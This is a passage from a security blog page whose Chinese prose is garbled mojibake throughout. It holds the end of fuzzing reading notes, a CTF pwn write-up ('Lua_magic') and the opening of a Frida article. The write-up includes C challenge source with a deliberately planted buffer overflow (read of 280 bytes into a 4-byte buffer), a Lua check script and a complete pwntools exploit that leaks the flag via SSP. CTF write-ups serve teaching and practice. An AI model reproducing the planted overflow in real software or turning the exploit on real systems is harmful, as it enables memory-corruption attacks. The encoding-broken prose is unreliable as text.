<li>è¿‡ç¨‹çŠ¶æ€å’Œè¿‡ç¨‹æ·±åº¦ï¼šæ­¤æ¦‚å¿µå¯ä»¥ç†è§£ä¸ºä»å®¶èµ°åˆ°å…¬å¸ï¼Œèµ°çš„æ¯ä¸€æ­¥éƒ½æ˜¯ä¸€æ¬¡çŠ¶æ€ã€‚è¿‡ç¨‹çŠ¶æ€å°±æ˜¯ç›®æ ‡è¿›ç¨‹åœ¨ä»»æ„ç»™å®šæ—¶åˆ»æ‰€å¤„çš„å…·ä½“çŠ¶æ€ï¼šå¦‚èµ°äº†1æ­¥å’Œèµ°äº†10æ­¥ï¼Œè€Œè¿‡ç¨‹æ·±åº¦æ—¶ä¸ºäº†è¾¾åˆ°æŸç‰¹å®šçŠ¶æ€æ‰€éœ€è¦å‰è¿›çš„æ­¥æ•°çš„åº¦é‡ï¼Œæˆ‘ä»¬èµ°åˆ°å…¬å¸æ—çš„çº¢ç»¿ç¯å’Œåˆšå‡ºé—¨ç»å¯¹ä¸ä¸€æ ·ã€‚è¿™æ—¶è¦å¼•å‡ºé€»è¾‘åˆ†ç¦»æ¦‚å¿µï¼Œæ¦‚å¿µå°±åƒå‡ºé—¨èµ°è·¯çš„æ–¹å‘ä¸€æ ·ï¼Œå¾€å·¦èµ°å’Œå³èµ°å¯èƒ½ä¼šå¯¼è‡´å®Œå…¨ä¸åŒçš„fuzzç»“æœï¼›</li>
<li>ä»£ç è¦†ç›–ï¼šæè¿°ç¨‹å¼ä¸­æºä»£ç è¢«æµ‹è¯•çš„æ¯”ä¾‹å’Œç¨‹åº¦ï¼Œæ‰€å¾—æ¯”ä¾‹ç§°ä¸ºä»£ç è¦†ç›–ç‡ã€‚ä½†æ˜¯åœ¨ä½œè€…å†™ä¹¦æ—¶è¿˜æ²¡æœ‰å“ªé¡¹fuzzæŠ€æœ¯èƒ½å¤Ÿè®°å½•è¯¥æŒ‡æ ‡ï¼›</li>
<li>é”™è¯¯æ£€æµ‹ï¼šfuzzæ˜¯â€œç›²ç›®çš„â€ï¼Œå®ƒä»¬ä¸çŸ¥é“è¢«æµ‹åº”ç”¨å¯¹è‡ªå·±çš„ååº”ï¼Œåªèƒ½é€šè¿‡ä¸€äº›å¾ˆâ€œç²—â€çš„æ–¹å¼æ£€æŸ¥ï¼Œä¾‹å¦‚ç¨‹åºæ˜¯å¦è¢«è·‘å´©ï¼Œèƒ½å¦pingé€šç­‰ï¼Œæ‰€ä»¥ä¸‹ä¸€ä»£æœ‰äº†è°ƒè¯•å®¢æˆ·ç«¯ï¼Œè¿›ä¸€æ­¥å±•æœ›æœ‰å¯èƒ½äºŒè¿›åˆ¶æ’è£…&#x2F;ç¿»è¯‘å¹³å°ï¼Œè¯¥å¹³å°å¾ˆåº•å±‚ï¼Œèƒ½æœ‰é’ˆå¯¹æ€§çš„å¯¹è¢«æµ‹ç›®æ ‡è¿›è¡Œåˆ†ææ’è£…ï¼›</li>
<li>èµ„æºçº¦æŸï¼šç®€å•æ¥è¯´å°±æ˜¯fuzzæ—¶å€™ç°å®ç‚¹ï¼ˆè€ƒè™‘å‘¨å…¨ï¼‰</li>
</ul>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210113180427-b89fee9a-5586-1.png"></p>
<h3 id="ç¬¬å…­ç« -è‡ªåŠ¨åŒ–ä¸æ•°æ®ç”Ÿæˆ"><a href="#ç¬¬å…­ç« -è‡ªåŠ¨åŒ–ä¸æ•°æ®ç”Ÿæˆ" class="headerlink" title="ç¬¬å…­ç«  è‡ªåŠ¨åŒ–ä¸æ•°æ®ç”Ÿæˆ"></a>ç¬¬å…­ç«  è‡ªåŠ¨åŒ–ä¸æ•°æ®ç”Ÿæˆ</h3><p>æœ¬ç« ä½œè€…å½’åˆ°äº†â€œç›®æ ‡ä¸è‡ªåŠ¨åŒ–ä¸­â€æ¨¡å—ä¸­ï¼Œä½†æ„Ÿè§‰å¯ä»¥åˆå¹¶åˆ°åŸºç¡€ä¸­</p>
<h4 id="è‡ªåŠ¨åŒ–ä»·å€¼"><a href="#è‡ªåŠ¨åŒ–ä»·å€¼" class="headerlink" title="è‡ªåŠ¨åŒ–ä»·å€¼"></a>è‡ªåŠ¨åŒ–ä»·å€¼</h4><ul>
<li>ç¨‹åºå‘˜ç›¸è¾ƒäºä¹‹å‰çš„æ—¶é—´ä»·å€¼è¢«æé«˜</li>
<li>fuzzä»€ä¹ˆäººéƒ½èƒ½åšï¼ˆå•Šè¿™ï¼‰</li>
<li>åŒæ ·çš„æµ‹è¯•ç”¨ä¾‹å¯èƒ½å¯¹ä¸åŒæœåŠ¡å™¨éƒ½äº§ç”Ÿæ•ˆæœ</li>
</ul>
<h4 id="æœ‰ç”¨çš„å·¥å…·å’Œåº“"><a href="#æœ‰ç”¨çš„å·¥å…·å’Œåº“" class="headerlink" title="æœ‰ç”¨çš„å·¥å…·å’Œåº“"></a>æœ‰ç”¨çš„å·¥å…·å’Œåº“</h4><ul>
<li><a target="_blank" rel="noopener" href="https://www.wireshark.org/">Wireshark Â· Go Deep.</a></li>
<li><a target="_blank" rel="noopener" href="http://bastard.sourceforge.net/libdisasm.html">libdisasm: x86 disassembler library (sourceforge.net)</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/jtpereyda/libdasm/blob/master/README.txt">libdasm&#x2F;README.txt at master Â· jtpereyda&#x2F;libdasm (github.com)</a></li>
<li><a target="_blank" rel="noopener" href="http://libnet.sourceforge.net/libnet.html">Libnet Documentation (sourceforge.net)</a></li>
<li><a target="_blank" rel="noopener" href="https://www.tcpdump.org/">TCPDUMP&#x2F;LIBPCAP public repository</a></li>
<li><a target="_blank" rel="noopener" href="https://sourceforge.net/projects/dotmetro/">metro packet library download | SourceForge.net</a></li>
<li><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/ptrace.2.html">ptrace(2) - Linux manual page (man7.org)</a></li>
<li>python æ‰©å±•ï¼šå¦‚Pcapyï¼ŒScapyå’ŒPyDbg</li>
</ul>
<h4 id="æ•°æ®ç”Ÿæˆä¸æ¨¡ç³Šè¯•æ¢å€¼"><a href="#æ•°æ®ç”Ÿæˆä¸æ¨¡ç³Šè¯•æ¢å€¼" class="headerlink" title="æ•°æ®ç”Ÿæˆä¸æ¨¡ç³Šè¯•æ¢å€¼"></a>æ•°æ®ç”Ÿæˆä¸æ¨¡ç³Šè¯•æ¢å€¼</h4><p>å› ä¸ºä¸å¯èƒ½ç©·ä¸¾æ‰€æœ‰è¾“å…¥ï¼Œæ‰€ä»¥è¾“å…¥ç”¨ä¾‹å¿…é¡»æœ‰æ‰€çªå‡º</p>
<ul>
<li>æ•´æ•°å€¼ï¼šå¦‚0å’Œ0xFFFFFFFFï¼Œç”šè‡³0xFFFFFFFF-1ã€0xFFFFFFFF-2ç­‰å¯¹å®ƒçš„åŠ å‡å€ä¹˜è¿ç®—ï¼›</li>
<li>å­—ç¬¦ä¸²é‡å¤ï¼šä¸€å †â€œAâ€å¯èƒ½å°±ä¼šå‘ç”Ÿå„ç§äº‹ï¼›</li>
<li>å­—æ®µåˆ†éš”ç¬¦ï¼šä¾‹å¦‚æœ‰æ—¶å€™åˆ†éš”ç¬¦èµ·ä¸€ä¸ªæ ‡å¿—ä½œç”¨ï¼Œç¨‹åºæ‰«ä¸åˆ°ä¼šä¸€ç›´ç´¯åŠ è®¡æ•°å™¨è¿›è€Œå¼•å‘æº¢å‡ºï¼›</li>
<li>æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼šè¿™ä¸ªå°±å¾ˆä¸¥é‡äº†è€Œä¸”å‘ç°åŠå…¶ç®€å•ï¼›</li>
<li>å­—ç¬¦ç¿»è¯‘ï¼šä¸åˆé€‚çš„å­—ç¬¦è½¬æ¢å¯èƒ½å¼•å‘ä¸æ­£ç¡®çš„ç»“æœï¼›</li>
<li>ç›®å½•éå†ï¼šç›®å½•éå†ä¿®é¥°ç¬¦ä¹Ÿè¦è¢«è€ƒè™‘ï¼›</li>
<li>å‘½ä»¤æ³¨å…¥ï¼šæœ‰æ—¶å€™æˆ‘ä»¬çš„è¾“å…¥ç»è¿‡æˆ‘ä»¬çš„æ„é€ å¯èƒ½ä¼šè¢«æ‰§è¡Œï¼Œæ‰€ä»¥å‘½ä»¤æ³¨å…¥ä¹Ÿå¾—æ‘†åœ¨çªå‡ºä½ç½®</li>
</ul>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210113180443-c1fcd232-5586-1.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/01/13/2021-01-13-fuzz_note/" data-id="cuidNTzpM4eKOZ7w5xEuYir7x" data-title="Reading notes" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2020-09-24-Lua_magic" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/09/24/2020-09-24-Lua_magic/" class="article-date">
  <time class="dt-published" datetime="2020-09-23T16:00:00.000Z" itemprop="datePublished">2020-09-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/09/24/2020-09-24-Lua_magic/">An interacting pwn</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å‰æ®µæ—¶é—´æ‰“äº†å›½èµ›ï¼Œå‡ºäº†é“bulidçš„pwné¢˜ï¼Œç”¨åˆ°äº†å‡ ä¸ªæ‚è€Œæœ‰è¶£çš„çŸ¥è¯†ç‚¹ï¼Œç©èµ·æ¥ä¸å¤ªå¸¸è§„ï¼Œåšèµ·æ¥ç”šè‡³å¯ä»¥è¯´æ˜¯æœ‰ç‚¹éš¾å—ï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://github.com/pic4xiu/C/blob/master/%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5/pwn/bin.zip">é¢˜ç›®é“¾æ¥</a></p>
<p>æ–‡æœ«ä¹Ÿæœ‰é“¾æ¥</p>
<h2 id="å‡ºé¢˜æ€è·¯"><a href="#å‡ºé¢˜æ€è·¯" class="headerlink" title="å‡ºé¢˜æ€è·¯"></a>å‡ºé¢˜æ€è·¯</h2><p>æœ€è¿‘å­¦äº†å­¦å®‰å“ï¼Œæƒ³åˆ°äº†ä¸€ä¸ªä¹‹å‰åˆ†æè¿‡çš„mobileæ¡ˆä¾‹ï¼Œä¸€ä¸ªapké€šè¿‡è°ƒç”¨luaå®ç°å‡½æ•°çš„é‡å†™ï¼ˆå°±æ˜¯ä¹‹å‰è¡€æ´—é«˜æ ¡çš„ä¸€ä¸ªapkï¼‰ï¼Œè§‰å¾—å¾ˆå¥½ç©ï¼Œå†³å®šåº”ç”¨åˆ°é¢˜ç›®é‡Œè¾¹ã€‚</p>
<p>æ–‡ä»¶ç»“æ„ï¼šä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸€ä¸ªåŠ å¯†è¿‡çš„Luaæ–‡ä»¶ï¼Œä¸€ä¸ªflagæ–‡ä»¶ã€‚</p>
<p>ç¨‹åºæµç¨‹ï¼š</p>
<ul>
<li>äºŒè¿›åˆ¶ç¨‹åºéƒ¨ç½²åœ¨ç‰¹å®šç«¯å£ï¼Œä½¿ç”¨ncè®¿é—®</li>
<li>ç¨‹åºèµ·æ¥åä¼šåŠ è½½åŠ å¯†è¿‡çš„luaæ–‡ä»¶åˆ°å†…å­˜ï¼Œä¹‹åç¨‹åºåœ¨å†…å­˜ä¸­è§£å¯†luaç¨‹åºï¼Œåœ¨ç¨‹åºä¸­è¾“å…¥å­—ç¬¦ï¼Œå°†å­—ç¬¦äº¤ç»™luaè¿›è¡Œå¤„ç†ï¼Œå¿…é¡»æ»¡è¶³æŸç§å…³ç³»ç¨‹åºæ‰èƒ½å‘ä¸‹è¿›è¡Œã€‚</li>
<li>å®Œæˆç»•è¿‡åé€‰æ‹©äº†ç¼“å†²åŒºæº¢å‡ºï¼Œæ–‡ä»¶æ²¡å…³canaryï¼Œç”¨ssp leakå¯ä»¥ç›´æ¥æŠŠflagè¯»å‡ºæ¥ã€‚æ•´ä½“çœ‹ä¸‹æ¥å°±æ˜¯ä¸€ä¸ªæŠ«ç€pwné¢˜å¤–è¡£çš„CåŠ luaç¨‹åºé€†å‘é¢˜ã€‚</li>
<li>å› ä¸ºç”¨åˆ°äº†å¥½å¤šCè¯­è¨€luaåº“å‡½æ•°çš„å¥½å¤šå‡½æ•°ï¼Œç”¨idaåˆ†æç¨‹åºä¼šå‘ç°éå¸¸æ¶å¿ƒï¼Œå¾—ä»”ç»†æ‰£ï¼Œä¹‹å‰æ²¡æ¥è§¦è¿‡è¿™ç§çš„è¿˜å¾—ç°å­¦ã€‚</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/lua/lua-environment.html">ç¯å¢ƒæ­å»º</a></p>
<h2 id="é¢˜ç›®æºç "><a href="#é¢˜ç›®æºç " class="headerlink" title="é¢˜ç›®æºç "></a>é¢˜ç›®æºç </h2><blockquote>
<p>å†™çš„æ—¶å€™ç°å­¦ç°å–ï¼Œè¯·å¸ˆå‚…ä»¬æŒ‡æ•™</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;lua5.1/lua.h&gt;</span><br><span class="line">#include &lt;lua5.1/lualib.h&gt;</span><br><span class="line">#include &lt;lua5.1/lauxlib.h&gt;</span><br><span class="line">char flag[0x20];</span><br><span class="line">char* c;</span><br><span class="line">uint8_t *enc(uint8_t *data, int size) &#123;//åŠ å¯†å‡½æ•°ï¼Œå’Œè§£å¯†å‡½æ•°å®Œå…¨ä¸€è‡´</span><br><span class="line">	uint8_t *temp = (uint8_t *)malloc(size);</span><br><span class="line">	int k[3]=&#123;2,3,5&#125;;</span><br><span class="line">	int i;</span><br><span class="line">	if (size) &#123;</span><br><span class="line">		for (i = 0; i &lt; size; i++) &#123;</span><br><span class="line">			temp[i] = data[i]^k[i%3];</span><br><span class="line">		&#125;</span><br><span class="line">	return temp;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	setvbuf(stdout,0,2,0);</span><br><span class="line">	FILE *f = fopen(&quot;main.lua&quot;, &quot;rb&quot;);//è¯»å…¥åŒç›®å½•åŠ å¯†è¿‡çš„luaæ–‡ä»¶</span><br><span class="line">	if (f == NULL)</span><br><span class="line">		return -1;</span><br><span class="line">	fseek(f, 0, SEEK_END);</span><br><span class="line">	long file_size = ftell(f);</span><br><span class="line">	uint8_t *buf = (uint8_t *)malloc(file_size);</span><br><span class="line">	rewind(f);</span><br><span class="line">	fread(buf, sizeof(char), file_size, f);</span><br><span class="line">	uint8_t *rea = enc(buf,file_size);</span><br><span class="line">	lua_State *luaEnv = lua_open();//åˆ›å»ºä¸€ä¸ªæ–°çš„lua_State</span><br><span class="line">	luaopen_base(luaEnv);</span><br><span class="line">	luaL_openlibs(luaEnv);</span><br><span class="line">	if(!luaEnv)</span><br><span class="line">	&#123;</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line">	int loadInfo = luaL_loadstring(luaEnv,rea);//ä»¥å­—ç¬¦ä¸²å½¢å¼æŠŠè§£å¯†è¿‡çš„luaè¯­å¥loadè¿›å»</span><br><span class="line">	if(loadInfo)</span><br><span class="line">	&#123;</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	int i,j,a,k=3;</span><br><span class="line">	puts(&quot;Hello I&#x27;m lua.\nLet&#x27;s experience something different&quot;);</span><br><span class="line">	while(k)&#123;</span><br><span class="line">		puts(&quot;Enter two numbers in your heart;)&quot;);</span><br><span class="line">		scanf(&quot;%d&quot;,&amp;i);</span><br><span class="line">		scanf(&quot;%d&quot;,&amp;j);</span><br><span class="line">		lua_pcall(luaEnv,0,0,0);</span><br><span class="line">		lua_getglobal(luaEnv,&quot;hndl&quot;);//æ‰¾è¿™ä¸ªåå­—çš„å‡½æ•°</span><br><span class="line">		lua_pushnumber(luaEnv,i);//ä»¥å †æ ˆå½¢å¼ä¼ å‚</span><br><span class="line">		lua_pushnumber(luaEnv,j);</span><br><span class="line">		puts(&quot;mamimami hon~~~~&quot;);</span><br><span class="line">		lua_pcall(luaEnv,2,1,0);//å®Œæˆè°ƒç”¨ï¼Œä¹‹åçš„å‚æ•°åˆ†åˆ«æ˜¯å‚æ•°ä¸ªæ•°ã€è¿”å›å€¼ä¸ªæ•°å’Œé”™è¯¯å¤„ç†å‡½æ•°ï¼ˆ0è¡¨ç¤ºæ— ï¼‰</span><br><span class="line">		a=lua_tonumber(luaEnv,-1);//åŒæ ·ä»¥å †æ ˆæ–¹å¼å–å€¼</span><br><span class="line">		puts(&quot;who am I?&quot;);</span><br><span class="line">		sleep(1);</span><br><span class="line">		printf(&quot;%d!!\n&quot;,a);</span><br><span class="line">		if(a==random())//å’Œä¼ªåŠ å¯†æ•°è¿›è¡Œæ¯”è¾ƒ</span><br><span class="line">			k--;//é‡å¤æ¬¡æ•°</span><br><span class="line">		else</span><br><span class="line">		&#123;	puts(&quot;Your ideas are different from Lua&#x27;s :( sry&quot;);</span><br><span class="line">			exit(0);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	char b[4];</span><br><span class="line">	FILE *fp;</span><br><span class="line">	fp = fopen(&quot;flag&quot;,&quot;r&quot;);</span><br><span class="line">	fread(flag,1,0x20,fp);</span><br><span class="line">	puts(&quot;All right,the magic failed&quot;);</span><br><span class="line">	read(0,b,280);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line">//gcc -o Lua_magic te.c -llua5.1</span><br></pre></td></tr></table></figure>

<p>çœ‹ä¸‹luaåŠ å¯†å‰çš„æºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function BitXOR(a,b)</span><br><span class="line">    local p,c=1,0</span><br><span class="line">    while a&gt;0 and b&gt;0 do</span><br><span class="line">        local ra,rb=a%2,b%2</span><br><span class="line">        if ra~=rb then c=c+p end</span><br><span class="line">        a,b,p=(a-ra)/2,(b-rb)/2,p*2</span><br><span class="line">    end</span><br><span class="line">    if a&lt;b then a=b end</span><br><span class="line">    while a&gt;0 do</span><br><span class="line">        local ra=a%2</span><br><span class="line">        if ra&gt;0 then c=c+p end</span><br><span class="line">        a,p=(a-ra)/2,p*2</span><br><span class="line">    end</span><br><span class="line">    return c</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">function hndl(i,j)</span><br><span class="line">	j = BitXOR(5977654,j)</span><br><span class="line">	return BitXOR(i,j)</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>ç”±äºlua5.1ä¸æ”¯æŒä½è¿ç®—ï¼Œæœ‰å¿…è¦å†™ä¸ªå¼‚æˆ–è¿ç®—å‡½æ•°åˆ°luaæ–‡ä»¶é‡Œè¾¹ã€‚æˆ‘æ²¡æ”¹BitXORåå­—ï¼Œç›´æ¥ç”¨äº†å¸ˆå‚…çš„è½®å­ã€‚åŒæ—¶ä½œä¸ºç™½å«–å…šåƒäººå˜´çŸ­ï¼Œåšå¼‚æˆ–å¤„ç†çš„æ—¶å€™ç”¨çš„5977654å’Œstackoverflowçš„è½®å­<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/5977654/how-do-i-use-the-bitwise-operator-xor-in-lua">qustionid</a>å¯¹åº”</p>
<h2 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><p>é€‰æ‰‹æ‹¿é¢˜ååº”è¯¥æ˜¯ä¸€ä¸ªLua_magicå’Œç»è¿‡å¤„ç†encè¿‡çš„main.luaï¼Œluaæ–‡ä»¶é•¿è¿™æ ·</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200920165319-badfa85c-fb1e-1.png"></p>
<p>ç”¨idaç®€å•çœ‹ä¸‹Lua_magic</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200920165333-c39101e4-fb1e-1.png"></p>
<p>å…¶å®è¿˜å¥½ï¼Œç”¨åˆ°çš„éƒ½åˆ†æå‡ºæ¥äº†ï¼Œä¹‹åå°±æ˜¯åŠ¨æ€è°ƒè¯•ç¨‹åºï¼ŒæŠŠå†…å­˜ä¸­è§£å¯†å®Œçš„luaç¨‹åºdumpå‡ºæ¥ï¼ˆencæ‰§è¡Œå®Œåä¸‹æ–­ï¼‰</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200920165349-ccf343f0-fb1e-1.png"></p>
<p>ç„¶åä¸€èµ·ç»“åˆdumpå‡ºæ¥çš„luaç¨‹åºå’Œidaä¸€èµ·åˆ†æå°±å¥½äº†ã€‚</p>
<p>éšæœºæ•°çš„ç”Ÿæˆè‡ªå·±å†™ä¸ªCè„šæœ¬ï¼š</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200920165403-d536d414-fb1e-1.png"></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200920165413-db41e0b0-fb1e-1.png"></p>
<p>ç®—èµ·æ¥çš„è¯å°±åç€æ¥å°±è¡Œï¼Œå’Œ1å¼‚æˆ–å®Œå’Œ5977654å¼‚æˆ–å°±å¥½äº†</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200920165428-e46d4396-fb1e-1.png"></p>
<p>æœ€åè¿›å…¥æœ€åä¸€æ­¥</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200920165443-ed31547c-fb1e-1.png"></p>
<p>è¯»å…¥0x118å­—èŠ‚ï¼Œå®Œå…¨å¤Ÿäº†ï¼Œå…¨æš´åŠ›å¡«flagçš„bssåœ°å€å°±å¥½ï¼Œexpå¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#ip=sys.argv[1]</span><br><span class="line">#port=sys.argv[2]</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">p=process(&#x27;./Lua_magic&#x27;)</span><br><span class="line">#p = remote(ip, port)</span><br><span class="line">p.recvuntil(&quot;Enter two numbers in your heart;)\n&quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.sendline(&quot;1808823120&quot;)</span><br><span class="line">sleep(1)</span><br><span class="line">p.recvuntil(&quot;Enter two numbers in your heart;)\n&quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.sendline(&quot;840963569&quot;)</span><br><span class="line">sleep(1)</span><br><span class="line">p.recvuntil(&quot;Enter two numbers in your heart;)\n&quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.sendline(&quot;1684516446&quot;)</span><br><span class="line">sleep(1)</span><br><span class="line">p.send(p64(0x602140)*35)</span><br><span class="line">#p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="ä¿®å¤-æ€»ç»“"><a href="#ä¿®å¤-æ€»ç»“" class="headerlink" title="ä¿®å¤ &amp; æ€»ç»“"></a>ä¿®å¤ &amp; æ€»ç»“</h2><p>å› ä¸ºbå°±4ä¸ªå­—èŠ‚ï¼Œpatchæˆ<code>read(0,b,4);</code>å³å¯å®Œæˆä¿®å¤ã€‚</p>
<p>è¿™é¢˜æµç¨‹æ¯”è¾ƒé•¿ï¼Œåœ¨åˆ’åˆ†é¢˜ç›®éš¾åº¦çš„æ—¶å€™è§‰å¾—éš¾ç‚¹å’Œäº®ç‚¹éƒ½åœ¨luaé‚£å—ï¼Œå°±å½’åˆ°äº†ä¸­ç­‰éš¾åº¦ã€‚åœ¨å¥½å‡ ä¸ªåœ°æ–¹éƒ½èƒ½ä¸Šä¸€ä¸ªéš¾åº¦ç³»æ•°ï¼Œå¦‚åŠ è§£å¯†luaè¯­å¥å‡½æ•°encã€luaè„šæœ¬å¤„ç†è¾“å…¥é€»è¾‘ã€readè¿›å»båå†æä¸ªluaè¯­å¥å¤„ç†ç­‰ï¼Œä½†æƒ³äº†æƒ³è¿˜æ˜¯ç®—äº†ï¼Œè§‰å¾—ç‚¹åˆ°ä¸ºæ­¢weiæœ€ä½³ï¼Œæœ¬èº«å‡ºè¿™ç§é¢˜è¿˜æ˜¯è€ƒéªŒçŸ¥è¯†ç§¯ç´¯å’Œå¿«é€Ÿå­¦ä¹ ï¼Œæ„Ÿè§‰å†éš¾ç‚¹å°±åäº†ã€‚</p>
<p>åˆšå‡ºå®Œæˆ‘è§‰å¾—è¿˜æ˜¯å¾ˆæœ‰è¶£çš„ï¼Œè‡ªå·±åšå®Œæ„Ÿè§‰å‡ ä¸ªè€ƒå¯Ÿçš„ç‚¹è¿˜æ˜¯æœ‰ç‚¹åƒµç¡¬ï¼Œå‡ºé¢˜çœŸçš„æ˜¯é—¨è‰ºæœ¯ã€‚</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/09/24/2020-09-24-Lua_magic/" data-id="cuid3urvWlMSRwO7m2i-3Q5Ou" data-title="An interacting pwn" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2020-09-02-frida_hook" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/09/02/2020-09-02-frida_hook/" class="article-date">
  <time class="dt-published" datetime="2020-09-01T16:00:00.000Z" itemprop="datePublished">2020-09-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/09/02/2020-09-02-frida_hook/">Introduction to Frida</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>é¦–å‘äº<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8211">å…ˆçŸ¥</a></p>
<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote>
<p>frida Xposedç®€å•å¯¹æ¯”</p>
</blockquote>
